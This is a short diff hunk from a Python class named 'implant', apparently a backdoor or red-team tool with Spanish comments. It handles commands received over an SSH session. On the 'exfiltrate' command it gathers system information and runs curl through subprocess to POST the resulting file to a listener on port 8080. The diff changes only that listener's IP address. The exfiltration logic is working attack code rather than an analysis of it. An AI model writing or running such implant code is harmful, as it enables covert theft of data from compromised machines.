@@ -149,7 +149,7 @@ class implant():
                     #modulo de exfiltracion de informacion
                     if ssh_command == "exfiltrate":
                         self.exfiltrate_info()
-                        comando = 'curl -X POST -F "file=@info.txt" http://192.168.0.13:8080/info.txt'
+                        comando = 'curl -X POST -F "file=@info.txt" http://192.168.0.100:8080/info.txt'
                         open_ssh_session.send("Archivo enviado")
                         subprocess.run(comando, shell=True, check=True)  
                     else:
